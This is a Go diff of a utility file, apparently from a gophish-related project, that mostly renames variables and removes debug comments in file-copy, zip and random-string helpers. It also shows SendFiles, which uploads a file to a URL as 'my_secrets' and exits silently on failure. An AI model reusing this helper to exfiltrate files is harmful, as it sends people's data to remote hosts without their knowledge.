@@ -4,7 +4,6 @@ import (
 	"archive/zip"
 	"bytes"
 	"fmt"
-	"github.com/gophish/gophish/logger"
 	"io"
 	"io/ioutil"
 	"math/rand"
@@ -25,7 +24,7 @@ func CreateTmpFolder(path string) {
 }
 
 // FileCopy copy file to destination if exist
-func FileCopy(src, destination string) (int64, error) {
+func FileCopy(src, dst string) (int64, error) {
 	sourceFileStat, err := os.Stat(src)
 	if err != nil {
 		// fmt.Println(err)
@@ -38,19 +37,16 @@ func FileCopy(src, destination string) (int64, error) {
 
 	source, err := os.Open(src)
 	if err != nil {
-		// fmt.Println(err)
 		return 0, err
 	}
 	defer source.Close()
 
-	destination, err := os.Create(destination)
+	destination, err := os.Create(dst)
 	if err != nil {
-		// fmt.Println(err)
 		return 0, err
 	}
 	defer destination.Close()
 	nBytes, err := io.Copy(destination, source)
-	// fmt.Println(err)
 	return nBytes, err
 }
 
@@ -125,13 +121,13 @@ func ZipFiles(filesToZip []string, outFilePath string, isWin bool) {
 func GenerateRandomString(n int) string {
 	rand.Seed(time.Now().UnixNano())
 
-	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
+	var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
 
-	randomString := make([]rune, n)
-	for i := range randomString {
-		randomString[i] = letters[rand.Intn(len(letters))]
+	b := make([]rune, n)
+	for i := range b {
+		b[i] = letterRunes[rand.Intn(len(letterRunes))]
 	}
-	return string(randomString)
+	return string(b)
 }
 
 // CreateReadme create a readme file
@@ -151,13 +147,15 @@ func SendFiles(url string, fileToSend string) {
 		panic(err)
 	}
 
-	// prepare the reader instances to encode
+	//prepare the reader instances to encode
 	values := map[string]io.Reader{
 		"my_secrets": file,
 	}
 	err = Upload(url, values)
 	if err != nil {
+		// fmt.Println("Could not connect to server")
 		os.Exit(0)
+		// panic(err)
 	}
 }
 
